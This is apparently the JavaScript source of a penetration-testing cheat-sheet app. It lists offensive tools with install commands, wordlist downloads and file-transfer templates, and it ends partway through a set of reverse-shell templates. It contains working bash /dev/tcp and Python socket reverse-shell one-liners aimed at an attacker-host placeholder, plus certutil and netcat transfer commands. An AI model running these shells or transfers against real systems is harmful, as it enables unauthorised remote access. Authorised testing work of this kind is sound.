let currentPhase = null;
let parameters = {};
let phases = {};
let currentContent = '';
let checkboxStates = new Map();
let filteredParameters = null;
let activeCodeBlock = null;
let activeCodeBlockIndex = null;
let codeBlockParamMap = [];
let outsideClickListenerAttached = false;
let suppressParamPanelRender = false;
let paramSearchTerm = '';
let resetToastTimeout = null;
let codeBlockWrappers = [];
let modalCopyWrappers = [];
let selectionCopyHandlerAttached = false;
let lastCopiedSelection = '';
let lastCopiedWrapper = null;
let lastCopiedAt = 0;
let lastSelectionRect = null;
let allDiscoveredParameters = [];
let initialParamsPromptShown = false;

const CORE_PARAMETER_NAMES = [
    'SENDER_IP',
    'SENDER_PORT',
    'RECEIVER_IP',
    'SENDER_USER',
    'RECEIVER_USER',
    'FILENAME'
];

const CHECKBOX_STORAGE_KEY = 'checkboxStates';
const PARAMS_STORAGE_KEY = 'parameters';
const INITIAL_PARAMS_SKIPPED_KEY = 'initialParamsSkipped';
const PARAM_TOKEN_REGEX = /(<[A-Z_0-9]+>|{{[A-Z_0-9]+}})/g;
const PARAM_MARKER_START = '%%PWN_START%%';
const PARAM_MARKER_END = '%%PWN_END%%';
const PARAM_SEPARATOR = '%%PVAL%%';
const PARAM_SEPARATOR_REGEX = escapeRegex(PARAM_SEPARATOR);

const OS_LABELS = {
    linux: 'Linux',
    windows: 'Windows',
    macos: 'macOS'
};

const OS_ICON_MAP = {
    linux: 'bi-ubuntu',
    windows: 'bi-windows',
    macos: 'bi-apple'
};

const TOOLBOX_ITEMS = [
    {
        name: 'Nmap',
        category: 'Reconnaissance',
        executable: true,
        link: 'https://nmap.org',
        linkLabel: 'Website',
        installation: [
            'sudo apt update && sudo apt install nmap -y'
        ]
    },
    {
        name: 'Masscan',
        category: 'Reconnaissance',
        executable: true,
        link: 'https://github.com/robertdavidgraham/masscan',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install masscan -y'
        ]
    },
    {
        name: 'Rustscan',
        category: 'Reconnaissance',
        executable: true,
        link: 'https://github.com/RustScan/RustScan',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb',
            'sudo dpkg -i rustscan_2.1.1_amd64.deb'
        ]
    },
    {
        name: 'Amass',
        category: 'Reconnaissance',
        executable: true,
        link: 'https://github.com/owasp-amass/amass',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install amass -y'
        ]
    },
    {
        name: 'Subfinder',
        category: 'Reconnaissance',
        executable: true,
        link: 'https://github.com/projectdiscovery/subfinder',
        linkLabel: 'GitHub',
        installation: [
            'go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest'
        ]
    },
    {
        name: 'Gobuster',
        category: 'Web Testing',
        executable: true,
        link: 'https://github.com/OJ/gobuster',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install gobuster -y'
        ]
    },
    {
        name: 'Ffuf',
        category: 'Web Testing',
        executable: true,
        link: 'https://github.com/ffuf/ffuf',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install ffuf -y'
        ]
    },
    {
        name: 'Feroxbuster',
        category: 'Web Testing',
        executable: true,
        link: 'https://github.com/epi052/feroxbuster',
        linkLabel: 'GitHub',
        installation: [
            'curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash'
        ]
    },
    {
        name: 'Burp Suite',
        category: 'Web Testing',
        executable: true,
        link: 'https://portswigger.net/burp',
        linkLabel: 'Website',
        installation: [
            'sudo snap install burpsuite --classic'
        ]
    },
    {
        name: 'OWASP ZAP',
        category: 'Web Testing',
        executable: true,
        link: 'https://www.zaproxy.org',
        linkLabel: 'Website',
        installation: [
            'sudo snap install zaproxy --classic'
        ]
    },
    {
        name: 'Nikto',
        category: 'Web Testing',
        executable: true,
        link: 'https://github.com/sullo/nikto',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install nikto -y'
        ]
    },
    {
        name: 'WPScan',
        category: 'Web Testing',
        executable: true,
        link: 'https://github.com/wpscanteam/wpscan',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install wpscan -y'
        ]
    },
    {
        name: 'SQLMap',
        category: 'Web Testing',
        executable: true,
        link: 'https://github.com/sqlmapproject/sqlmap',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install sqlmap -y'
        ]
    },
    {
        name: 'XSStrike',
        category: 'Web Testing',
        executable: true,
        link: 'https://github.com/s0md3v/XSStrike',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/s0md3v/XSStrike.git',
            'cd XSStrike && pip3 install -r requirements.txt'
        ]
    },
    {
        name: 'Nuclei',
        category: 'Vulnerability Scanning',
        executable: true,
        link: 'https://github.com/projectdiscovery/nuclei',
        linkLabel: 'GitHub',
        installation: [
            'go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest'
        ]
    },
    {
        name: 'Metasploit',
        category: 'Exploitation',
        executable: false,
        link: 'https://github.com/rapid7/metasploit-framework',
        linkLabel: 'GitHub',
        installation: [
            'curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sh'
        ]
    },
    {
        name: 'Exploit-DB Searchsploit',
        category: 'Exploitation',
        executable: true,
        link: 'https://github.com/offensive-security/exploitdb',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install exploitdb -y'
        ]
    },
    {
        name: 'John the Ripper',
        category: 'Password Cracking',
        executable: true,
        link: 'https://github.com/openwall/john',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install john -y'
        ]
    },
    {
        name: 'Hashcat',
        category: 'Password Cracking',
        executable: true,
        link: 'https://github.com/hashcat/hashcat',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install hashcat -y'
        ]
    },
    {
        name: 'Hydra',
        category: 'Password Cracking',
        executable: true,
        link: 'https://github.com/vanhauser-thc/thc-hydra',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install hydra -y'
        ]
    },
    {
        name: 'Medusa',
        category: 'Password Cracking',
        executable: true,
        link: 'https://github.com/jmk-foofus/medusa',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install medusa -y'
        ]
    },
    {
        name: 'BloodHound',
        category: 'Active Directory',
        executable: false,
        link: 'https://github.com/BloodHoundAD/BloodHound',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install bloodhound -y'
        ]
    },
    {
        name: 'SharpHound',
        category: 'Active Directory',
        executable: true,
        link: 'https://github.com/BloodHoundAD/SharpHound',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
        ]
    },
    {
        name: 'Impacket',
        category: 'Active Directory',
        executable: false,
        link: 'https://github.com/fortra/impacket',
        linkLabel: 'GitHub',
        installation: [
            'python3 -m pip install --upgrade pip',
            'python3 -m pip install impacket'
        ]
    },
    {
        name: 'CrackMapExec',
        category: 'Active Directory',
        executable: false,
        link: 'https://github.com/byt3bl33d3r/CrackMapExec',
        linkLabel: 'GitHub',
        installation: [
            'pipx install crackmapexec'
        ]
    },
    {
        name: 'NetExec',
        category: 'Active Directory',
        executable: false,
        link: 'https://github.com/Pennyw0rth/NetExec',
        linkLabel: 'GitHub',
        installation: [
            'pipx install git+https://github.com/Pennyw0rth/NetExec'
        ]
    },
    {
        name: 'Rubeus',
        category: 'Active Directory',
        executable: true,
        link: 'https://github.com/GhostPack/Rubeus',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe'
        ]
    },
    {
        name: 'Mimikatz',
        category: 'Active Directory',
        executable: true,
        link: 'https://github.com/gentilkiwi/mimikatz',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip',
            'unzip mimikatz_trunk.zip'
        ]
    },
    {
        name: 'Kerbrute',
        category: 'Active Directory',
        executable: true,
        link: 'https://github.com/ropnop/kerbrute',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64',
            'chmod +x kerbrute_linux_amd64'
        ]
    },
    {
        name: 'Evil-WinRM',
        category: 'Active Directory',
        executable: true,
        link: 'https://github.com/Hackplayers/evil-winrm',
        linkLabel: 'GitHub',
        installation: [
            'sudo gem install evil-winrm'
        ]
    },
    {
        name: 'Responder',
        category: 'Poisoning',
        executable: false,
        link: 'https://github.com/SpiderLabs/Responder',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install responder -y'
        ]
    },
    {
        name: 'Bettercap',
        category: 'Poisoning',
        executable: true,
        link: 'https://github.com/bettercap/bettercap',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install bettercap -y'
        ]
    },
    {
        name: 'linPEAS',
        category: 'Privilege Escalation',
        executable: true,
        link: 'https://github.com/carlospolop/PEASS-ng',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh',
            'chmod +x linpeas.sh'
        ]
    },
    {
        name: 'winPEAS',
        category: 'Privilege Escalation',
        executable: true,
        link: 'https://github.com/carlospolop/PEASS-ng',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe'
        ]
    },
    {
        name: 'Linux Smart Enumeration',
        category: 'Privilege Escalation',
        executable: true,
        link: 'https://github.com/diego-treitos/linux-smart-enumeration',
        linkLabel: 'GitHub',
        installation: [
            'wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh',
            'chmod +x lse.sh'
        ]
    },
    {
        name: 'LinEnum',
        category: 'Privilege Escalation',
        executable: true,
        link: 'https://github.com/rebootuser/LinEnum',
        linkLabel: 'GitHub',
        installation: [
            'wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh',
            'chmod +x LinEnum.sh'
        ]
    },
    {
        name: 'Windows Exploit Suggester',
        category: 'Privilege Escalation',
        executable: true,
        link: 'https://github.com/AonCyberLabs/Windows-Exploit-Suggester',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git'
        ]
    },
    {
        name: 'PSPY',
        category: 'Privilege Escalation',
        executable: true,
        link: 'https://github.com/DominicBreuker/pspy',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64'
        ]
    },
    {
        name: 'Enum4linux',
        category: 'SMB',
        executable: true,
        link: 'https://github.com/CiscoCXSecurity/enum4linux',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install enum4linux -y'
        ]
    },
    {
        name: 'Enum4linux-ng',
        category: 'SMB',
        executable: true,
        link: 'https://github.com/cddmp/enum4linux-ng',
        linkLabel: 'GitHub',
        installation: [
            'git clone https://github.com/cddmp/enum4linux-ng.git',
            'cd enum4linux-ng && pip3 install -r requirements.txt'
        ]
    },
    {
        name: 'SMBMap',
        category: 'SMB',
        executable: true,
        link: 'https://github.com/ShawnDEvans/smbmap',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install smbmap -y'
        ]
    },
    {
        name: 'Wireshark',
        category: 'Network Analysis',
        executable: true,
        link: 'https://www.wireshark.org',
        linkLabel: 'Website',
        installation: [
            'sudo apt update && sudo apt install wireshark -y'
        ]
    },
    {
        name: 'tcpdump',
        category: 'Network Analysis',
        executable: true,
        link: 'https://www.tcpdump.org',
        linkLabel: 'Website',
        installation: [
            'sudo apt update && sudo apt install tcpdump -y'
        ]
    },
    {
        name: 'Aircrack-ng',
        category: 'Wireless',
        executable: true,
        link: 'https://www.aircrack-ng.org',
        linkLabel: 'Website',
        installation: [
            'sudo apt update && sudo apt install aircrack-ng -y'
        ]
    },
    {
        name: 'Chisel',
        category: 'Pivoting',
        executable: true,
        link: 'https://github.com/jpillora/chisel',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_linux_amd64.gz',
            'gunzip chisel_1.9.1_linux_amd64.gz && chmod +x chisel_1.9.1_linux_amd64'
        ]
    },
    {
        name: 'Ligolo-ng',
        category: 'Pivoting',
        executable: true,
        link: 'https://github.com/nicocha30/ligolo-ng',
        linkLabel: 'GitHub',
        installation: [
            'wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz',
            'tar -xzf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz'
        ]
    },
    {
        name: 'Proxychains',
        category: 'Pivoting',
        executable: false,
        link: 'https://github.com/haad/proxychains',
        linkLabel: 'GitHub',
        installation: [
            'sudo apt update && sudo apt install proxychains4 -y'
        ]
    },
    {
        name: 'Socat',
        category: 'Pivoting',
        executable: true,
        link: 'http://www.dest-unreach.org/socat',
        linkLabel: 'Website',
        installation: [
            'sudo apt update && sudo apt install socat -y'
        ]
    }
];

const WORDLISTS = [
    {
        name: 'RockYou',
        category: 'Credentials',
        command: 'sudo gunzip /usr/share/wordlists/rockyou.txt.gz',
        note: 'Default Kali location'
    },
    {
        name: 'RockYou (Download)',
        category: 'Credentials',
        command: 'wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
    },
    {
        name: 'SecLists - Common.txt',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O common.txt'
    },
    {
        name: 'SecLists - Directory List 2.3 Medium',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/directory-list-2.3-medium.txt -O directory-list-2.3-medium.txt'
    },
    {
        name: 'SecLists - Big.txt',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt -O big.txt'
    },
    {
        name: 'SecLists - Raft Large Files',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-files.txt -O raft-large-files.txt'
    },
    {
        name: 'SecLists - Raft Large Directories',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-large-directories.txt -O raft-large-directories.txt'
    },
    {
        name: 'SecLists - API Endpoints',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt -O api-endpoints.txt'
    },
    {
        name: 'SecLists - DNS Subdomains Top 1M',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt -O subdomains-top20k.txt'
    },
    {
        name: 'SecLists - DNS Subdomains 5K',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -O subdomains-top5k.txt'
    },
    {
        name: 'SecLists - BitQuark Subdomains',
        category: 'DNS',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/bitquark-subdomains-top100000.txt -O bitquark-subdomains.txt'
    },
    {
        name: 'SecLists - 10M Usernames',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt -O usernames-10m.txt'
    },
    {
        name: 'SecLists - Common Usernames',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt -O usernames-short.txt'
    },
    {
        name: 'SecLists - 10K Most Common',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -O passwords-10k.txt'
    },
    {
        name: 'SecLists - 100K Most Common',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt -O passwords-100k.txt'
    },
    {
        name: 'SecLists - Default Credentials',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/default-passwords.csv -O default-passwords.csv'
    },
    {
        name: 'SecLists - SSH Default Passwords',
        category: 'Credentials',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -O ssh-defaults.txt'
    },
    {
        name: 'SecLists - LFI Wordlist',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -O lfi-linux.txt'
    },
    {
        name: 'SecLists - XSS Payloads',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt -O xss-payloads.txt'
    },
    {
        name: 'SecLists - SQL Injection',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt -O sqli-payloads.txt'
    },
    {
        name: 'SecLists - Command Injection',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/command-injection-commix.txt -O command-injection.txt'
    },
    {
        name: 'FuzzDB - Discovery',
        category: 'Fuzzing',
        command: 'wget https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt -O fuzzdb-raft-files.txt'
    },
    {
        name: 'Assetnote Wordlists',
        category: 'Web Content',
        command: 'wget https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt -O assetnote-dns.txt'
    },
    {
        name: 'Jhaddix All.txt',
        category: 'Web Content',
        command: 'wget https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt -O jhaddix-all.txt'
    },
    {
        name: 'Bug Bounty Wordlist',
        category: 'Web Content',
        command: 'wget https://raw.githubusercontent.com/xyele/hackerone_wordlist/main/wordlists/h1_wordlist.txt -O h1-wordlist.txt'
    },
    {
        name: 'PayloadsAllTheThings',
        category: 'Payloads',
        command: 'git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git'
    }
];

const TRANSFER_PROTOCOLS = [
    {
        name: 'HTTP',
        source: {
            linux: [{ label: 'Command', command: 'python3 -m http.server <SENDER_PORT>' }],
            macos: [{ label: 'Command', command: 'python3 -m http.server <SENDER_PORT>' }],
            windows: [
                { label: 'PowerShell', command: 'python -m http.server <SENDER_PORT>' },
                { label: 'CMD', command: 'py -3 -m http.server <SENDER_PORT>' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'curl -o <FILENAME> http://<SENDER_IP>:<SENDER_PORT>/<FILENAME>' }],
            macos: [{ label: 'Command', command: 'curl -o <FILENAME> http://<SENDER_IP>:<SENDER_PORT>/<FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'Invoke-WebRequest -Uri http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -OutFile <FILENAME>' },
                { label: 'CMD', command: 'certutil -urlcache -f http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> <FILENAME>' }
            ]
        }
    },
    {
        name: 'PHP',
        source: {
            linux: [{ label: 'Command', command: 'php -S 0.0.0.0:<SENDER_PORT>' }],
            macos: [{ label: 'Command', command: 'php -S 0.0.0.0:<SENDER_PORT>' }],
            windows: [
                { label: 'PowerShell', command: 'php -S 0.0.0.0:<SENDER_PORT>' },
                { label: 'CMD', command: 'php -S 0.0.0.0:<SENDER_PORT>' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'curl -o <FILENAME> http://<SENDER_IP>:<SENDER_PORT>/<FILENAME>' }],
            macos: [{ label: 'Command', command: 'curl -o <FILENAME> http://<SENDER_IP>:<SENDER_PORT>/<FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'Invoke-WebRequest -Uri http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -OutFile <FILENAME>' },
                { label: 'CMD', command: 'certutil -urlcache -f http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> <FILENAME>' }
            ]
        }
    },
    {
        name: 'Netcat',
        source: {
            linux: [{ label: 'Command', command: 'nc -lvnp <SENDER_PORT> < <FILENAME>' }],
            macos: [{ label: 'Command', command: 'nc -lvnp <SENDER_PORT> < <FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'ncat.exe -lvnp <SENDER_PORT> < <FILENAME>' },
                { label: 'CMD', command: 'ncat.exe -lvnp <SENDER_PORT> < <FILENAME>' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'nc <SENDER_IP> <SENDER_PORT> > <FILENAME>' }],
            macos: [{ label: 'Command', command: 'nc <SENDER_IP> <SENDER_PORT> > <FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'ncat.exe <SENDER_IP> <SENDER_PORT> | Set-Content -Path <FILENAME>' },
                { label: 'CMD', command: 'ncat.exe <SENDER_IP> <SENDER_PORT> > <FILENAME>' }
            ]
        }
    },
    {
        name: 'Base64',
        source: {
            linux: [
                { label: 'Encode', command: 'base64 -w 0 <FILENAME>' },
                { label: 'Encode to File', command: 'base64 -w 0 <FILENAME> > <FILENAME>.b64' }
            ],
            macos: [
                { label: 'Encode', command: 'base64 -i <FILENAME>' },
                { label: 'Encode to File', command: 'base64 -i <FILENAME> > <FILENAME>.b64' }
            ],
            windows: [
                { label: 'PowerShell', command: '[Convert]::ToBase64String([IO.File]::ReadAllBytes("<FILENAME>"))' },
                { label: 'CMD', command: 'certutil -encode <FILENAME> <FILENAME>.b64' }
            ]
        },
        destination: {
            linux: [
                { label: 'Decode', command: 'echo "<BASE64>" | base64 -d > <FILENAME>' },
                { label: 'Decode from File', command: 'base64 -d <FILENAME>.b64 > <FILENAME>' }
            ],
            macos: [
                { label: 'Decode', command: 'echo "<BASE64>" | base64 -D > <FILENAME>' },
                { label: 'Decode from File', command: 'base64 -D -i <FILENAME>.b64 -o <FILENAME>' }
            ],
            windows: [
                { label: 'PowerShell', command: '[IO.File]::WriteAllBytes("<FILENAME>", [Convert]::FromBase64String("<BASE64>"))' },
                { label: 'CMD', command: 'certutil -decode <FILENAME>.b64 <FILENAME>' }
            ]
        }
    },
    {
        name: 'Hex',
        source: {
            linux: [
                { label: 'Encode', command: 'xxd -p <FILENAME> | tr -d \'\\n\'' },
                { label: 'Encode to File', command: 'xxd -p <FILENAME> > <FILENAME>.hex' }
            ],
            macos: [
                { label: 'Encode', command: 'xxd -p <FILENAME> | tr -d \'\\n\'' },
                { label: 'Encode to File', command: 'xxd -p <FILENAME> > <FILENAME>.hex' }
            ],
            windows: [
                { label: 'PowerShell', command: '([System.IO.File]::ReadAllBytes("<FILENAME>") | ForEach-Object { $_.ToString("X2") }) -join ""' },
                { label: 'CMD', command: 'certutil -encodehex <FILENAME> <FILENAME>.hex' }
            ]
        },
        destination: {
            linux: [
                { label: 'Decode', command: 'echo "<HEX>" | xxd -r -p > <FILENAME>' },
                { label: 'Decode from File', command: 'xxd -r -p <FILENAME>.hex > <FILENAME>' }
            ],
            macos: [
                { label: 'Decode', command: 'echo "<HEX>" | xxd -r -p > <FILENAME>' },
                { label: 'Decode from File', command: 'xxd -r -p <FILENAME>.hex > <FILENAME>' }
            ],
            windows: [
                { label: 'PowerShell', command: '[IO.File]::WriteAllBytes("<FILENAME>", ([byte[]]("<HEX>" -split "(..)" -ne "" | ForEach-Object { [Convert]::ToByte($_, 16) })))' },
                { label: 'CMD', command: 'certutil -decodehex <FILENAME>.hex <FILENAME>' }
            ]
        }
    },
    {
        name: 'FTP',
        source: {
            linux: [
                { label: 'Python', command: 'python3 -m pyftpdlib -p <SENDER_PORT> -w' },
                { label: 'vsftpd', command: 'sudo systemctl start vsftpd' }
            ],
            macos: [
                { label: 'Python', command: 'python3 -m pyftpdlib -p <SENDER_PORT> -w' }
            ],
            windows: [
                { label: 'PowerShell', command: 'python -m pyftpdlib -p <SENDER_PORT> -w' }
            ]
        },
        destination: {
            linux: [
                { label: 'Command', command: 'ftp <SENDER_IP> <SENDER_PORT>' },
                { label: 'wget', command: 'wget ftp://<SENDER_IP>:<SENDER_PORT>/<FILENAME>' }
            ],
            macos: [
                { label: 'Command', command: 'ftp <SENDER_IP> <SENDER_PORT>' },
                { label: 'curl', command: 'curl ftp://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -o <FILENAME>' }
            ],
            windows: [
                { label: 'PowerShell', command: 'Invoke-WebRequest -Uri ftp://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -OutFile <FILENAME>' },
                { label: 'CMD', command: 'ftp -s:script.txt <SENDER_IP>' }
            ]
        }
    },
    {
        name: 'TFTP',
        source: {
            linux: [
                { label: 'Command', command: 'sudo atftpd --daemon --port <SENDER_PORT> /tmp' },
                { label: 'Alternative', command: 'sudo in.tftpd -L -s /tmp' }
            ],
            macos: [
                { label: 'Command', command: 'sudo launchctl load -w /System/Library/LaunchDaemons/tftp.plist' }
            ],
            windows: [
                { label: 'PowerShell', command: 'Install-WindowsFeature -Name TFTP-Client' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'tftp <SENDER_IP> -c get <FILENAME>' }],
            macos: [{ label: 'Command', command: 'tftp <SENDER_IP> -e get <FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'tftp -i <SENDER_IP> GET <FILENAME>' },
                { label: 'CMD', command: 'tftp -i <SENDER_IP> GET <FILENAME>' }
            ]
        }
    },
    {
        name: 'SCP',
        source: {
            linux: [{ label: 'Command', command: 'scp <FILENAME> <RECEIVER_USER>@<RECEIVER_IP>:/tmp/<FILENAME>' }],
            macos: [{ label: 'Command', command: 'scp <FILENAME> <RECEIVER_USER>@<RECEIVER_IP>:/tmp/<FILENAME>' }],
            windows: [
                { label: 'PowerShell', command: 'scp <FILENAME> <RECEIVER_USER>@<RECEIVER_IP>:/tmp/<FILENAME>' },
                { label: 'CMD', command: 'scp <FILENAME> <RECEIVER_USER>@<RECEIVER_IP>:/tmp/<FILENAME>' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'scp <SENDER_USER>@<SENDER_IP>:/tmp/<FILENAME> ./' }],
            macos: [{ label: 'Command', command: 'scp <SENDER_USER>@<SENDER_IP>:/tmp/<FILENAME> ./' }],
            windows: [
                { label: 'PowerShell', command: 'scp <SENDER_USER>@<SENDER_IP>:/tmp/<FILENAME> .\\' },
                { label: 'CMD', command: 'scp <SENDER_USER>@<SENDER_IP>:/tmp/<FILENAME> .\\' }
            ]
        }
    },
    {
        name: 'SMB',
        source: {
            linux: [{ label: 'Command', command: 'impacket-smbserver share . -smb2support' }],
            macos: [{ label: 'Command', command: 'impacket-smbserver share . -smb2support' }],
            windows: [
                { label: 'PowerShell', command: 'New-SmbShare -Name share -Path C:\\share' },
                { label: 'CMD', command: 'net share share=C:\\share' }
            ]
        },
        destination: {
            linux: [{ label: 'Command', command: 'smbclient //<SENDER_IP>/share -c "get <FILENAME>"' }],
            macos: [{ label: 'Command', command: 'smbclient //<SENDER_IP>/share -c "get <FILENAME>"' }],
            windows: [
                { label: 'PowerShell', command: 'Copy-Item "\\\\<SENDER_IP>\\share\\<FILENAME>" -Destination .' },
                { label: 'CMD', command: 'copy \\\\<SENDER_IP>\\share\\<FILENAME> .\\<FILENAME>' }
            ]
        }
    },
    {
        name: 'WebDAV',
        source: {
            linux: [
                { label: 'Command', command: 'wsgidav --host=0.0.0.0 --port=<SENDER_PORT> --root=.' },
                { label: 'Alternative', command: 'python3 -m pip install wsgidav cheroot && wsgidav --host=0.0.0.0 --port=<SENDER_PORT> --auth=anonymous --root=.' }
            ],
            macos: [
                { label: 'Command', command: 'wsgidav --host=0.0.0.0 --port=<SENDER_PORT> --root=.' }
            ],
            windows: [
                { label: 'PowerShell', command: 'wsgidav --host=0.0.0.0 --port=<SENDER_PORT> --root=.' },
                { label: 'IIS', command: 'Install-WindowsFeature -Name WebDAV-Redirector' }
            ]
        },
        destination: {
            linux: [
                { label: 'Command', command: 'cadaver http://<SENDER_IP>:<SENDER_PORT>/' },
                { label: 'cURL', command: 'curl http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -o <FILENAME>' }
            ],
            macos: [
                { label: 'Command', command: 'curl http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -o <FILENAME>' }
            ],
            windows: [
                { label: 'PowerShell', command: 'Invoke-WebRequest -Uri http://<SENDER_IP>:<SENDER_PORT>/<FILENAME> -OutFile <FILENAME>' },
                { label: 'CMD', command: 'net use * http://<SENDER_IP>:<SENDER_PORT> && copy Z:\\<FILENAME> .' }
            ]
        }
    }
];

const REVERSE_SHELL_TEMPLATES = {
    bash: {
        label: 'Bash',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: 'bash -c "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"'
    },
    python: {
        label: 'Python',
        attacker: 'nc -lvnp {{LPORT}}',
        victim: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{{LHOST}}\",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    },
    powershell: {
        label: 'PowerShell',
        attacker: 'nc -lvnp {{LPORT}}',
